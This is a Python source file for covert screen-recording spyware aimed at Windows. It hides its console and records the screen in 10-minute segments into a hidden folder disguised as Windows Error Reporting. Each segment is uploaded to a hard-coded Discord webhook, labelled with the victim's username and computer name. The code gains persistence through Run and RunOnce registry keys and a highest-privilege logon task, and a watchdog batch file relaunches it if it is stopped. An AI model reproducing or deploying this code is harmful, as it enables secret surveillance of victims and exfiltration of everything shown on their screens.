import cv2
import numpy as np
import mss
import time
import threading
import os
import sys
import ctypes
import requests
import glob
import shutil
import subprocess
from datetime import datetime
from PIL import Image

# WEBHOOK MIS À JOUR
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1538378061521883226/U1caRDreoLLjzXoJNaSWjnWv5-IoeonGojmn0euPIEKqmigzpEsP2AhJQb8Ld1jT4PcX"

class InfiniteScreenRecorder:
    def __init__(self):
        self.recording = True
        self.sct = mss.mss()
        self.monitor = self.sct.monitors[1]
        self.fps = 8
        self.resolution = (1024, 576)
        self.segment_duration = 600
        
        self.output_dir = os.path.join(os.environ.get('LOCALAPPDATA'), 'Microsoft', 'Windows', 'WER', 'ReportQueue')
        os.makedirs(self.output_dir, exist_ok=True)
        
        if os.name == 'nt':
            try:
                ctypes.windll.kernel32.SetFileAttributesW(self.output_dir, 0x02 | 0x04)
            except:
                pass
        
        self.current_file = None
        self.video_writer = None
        self.start_time = None
        self.segment_count = 0
        
    def get_filename(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        user = os.environ.get('USERNAME', 'unknown')
        return os.path.join(self.output_dir, f"Report_{timestamp}_{user}.avi")
    
    def init_writer(self):
        self.current_file = self.get_filename()
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        self.video_writer = cv2.VideoWriter(self.current_file, fourcc, self.fps, self.resolution, isColor=True)
        self.start_time = time.time()
        self.segment_count += 1
        return self.current_file
    
    def capture_frame(self):
        try:
            screenshot = self.sct.grab(self.monitor)
            img = np.frombuffer(screenshot.rgb, dtype=np.uint8)
            img = img.reshape((screenshot.height, screenshot.width, 3))
            img = cv2.resize(img, self.resolution, interpolation=cv2.INTER_LINEAR)
            img = cv2.cvtColor(img, cv2.COLOR_RGB2BGR)
            return img
        except:
            return np.zeros((self.resolution[1], self.resolution[0], 3), dtype=np.uint8)
    
    def record_loop(self):
        self.init_writer()
        frame_time = 1.0 / self.fps
        
        while True:
            try:
                loop_start = time.time()
                
                if time.time() - self.start_time >= self.segment_duration:
                    self.rotate_file()
                
                frame = self.capture_frame()
                if frame is not None and self.video_writer:
                    self.video_writer.write(frame)
                
                processing_time = time.time() - loop_start
                sleep_time = frame_time - processing_time
                if sleep_time > 0:
                    time.sleep(sleep_time)
                    
            except:
                time.sleep(1)
                continue
    
    def rotate_file(self):
        try:
            if self.video_writer:
                self.video_writer.release()
                self.video_writer = None
            
            file_to_send = self.current_file
            self.init_writer()
            
            if file_to_send and os.path.exists(file_to_send):
                sender_thread = threading.Thread(target=self.send_video, args=(file_to_send,), daemon=True)
                sender_thread.start()
        except:
            self.init_writer()
    
    def compress_video(self, input_path):
        try:
            output_path = input_path.replace('.avi', '.mp4')
            cap = cv2.VideoCapture(input_path)
            fourcc = cv2.VideoWriter_fourcc(*'avc1')
            out = cv2.VideoWriter(output_path, fourcc, self.fps, self.resolution)
            
            while True:
                ret, frame = cap.read()
                if not ret:
                    break
                out.write(frame)
            
            cap.release()
            out.release()
            
            try:
                os.remove(input_path)
            except:
                pass
            
            return output_path if os.path.exists(output_path) else input_path
        except:
            return input_path
    
    def send_video(self, filepath):
        if not os.path.exists(filepath):
            return
        
        max_retries = 10
        retry_count = 0
        
        while retry_count < max_retries:
            try:
                compressed = self.compress_video(filepath)
                file_size = os.path.getsize(compressed)
                
                user = os.environ.get('USERNAME', 'unknown')
                computer = os.environ.get('COMPUTERNAME', 'unknown')
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                if file_size > 8 * 1024 * 1024:
                    compressed = self.heavy_compress(compressed)
                
                with open(compressed, 'rb') as f:
                    files = {'file': (os.path.basename(compressed), f, 'video/mp4')}
                    payload = {
                        'payload_json': f'{{"content": "🎥 **Screen [{self.segment_count}]**\\n👤 `{user}` | 💻 `{computer}`\\n🕐 `{timestamp}` | 📊 `{file_size/1024/1024:.1f}MB`", "username": "WinReport"}}'
                    }
                    
                    response = requests.post(WEBHOOK_URL, data=payload, files=files, timeout=120)
                
                try:
                    os.remove(compressed)
                except:
                    pass
                return
                
            except:
                retry_count += 1
                time.sleep(30)
    
    def heavy_compress(self, filepath):
        try:
            output_path = filepath.replace('.mp4', '_min.mp4')
            cap = cv2.VideoCapture(filepath)
            small_res = (640, 360)
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            out = cv2.VideoWriter(output_path, fourcc, 5, small_res)
            
            while True:
                ret, frame = cap.read()
                if not ret:
                    break
                frame = cv2.resize(frame, small_res)
                out.write(frame)
            
            cap.release()
            out.release()
            os.remove(filepath)
            return output_path
        except:
            return filepath

def hide_console():
    if os.name == 'nt':
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except:
            pass

def persistence_aggressive():
    try:
        import winreg as reg
        
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(sys.argv[0])
        
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE) as key:
                reg.SetValueEx(key, "WindowsErrorReporting", 0, reg.REG_SZ, f'"{exe_path}"')
        except:
            pass
        
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
            with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE) as key:
                reg.SetValueEx(key, "WERUpdate", 0, reg.REG_SZ, f'"{exe_path}"')
        except:
            pass
        
        try:
            subprocess.run([
                'schtasks', '/create', '/f', '/tn', 'WindowsErrorReportingTask',
                '/tr', f'"{exe_path}"', '/sc', 'onlogon', '/rl', 'highest'
            ], capture_output=True)
        except:
            pass
    except:
        pass

def watchdog():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        script_dir = os.path.dirname(os.path.abspath(__file__))
        bat_path = os.path.join(script_dir, 'winupd.bat')
        
        with open(bat_path, 'w') as f:
            f.write(f'@echo off\n:loop\ntimeout /t 30 >nul\ntasklist | find /i "{os.path.basename(exe_path)}" >nul\nif errorlevel 1 (\n    start "" "{exe_path}"\n)\ngoto loop')
        
        subprocess.Popen(['cmd', '/c', bat_path], 
                        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP,
                        close_fds=True)
    except:
        pass

def main():
    hide_console()
    persistence_aggressive()
    
    threading.Thread(target=watchdog, daemon=True).start()
    time.sleep(2)
    
    while True:
        try:
            recorder = InfiniteScreenRecorder()
            recorder.record_loop()
        except:
            time.sleep(10)
            continue

if __name__ == "__main__":
    main()
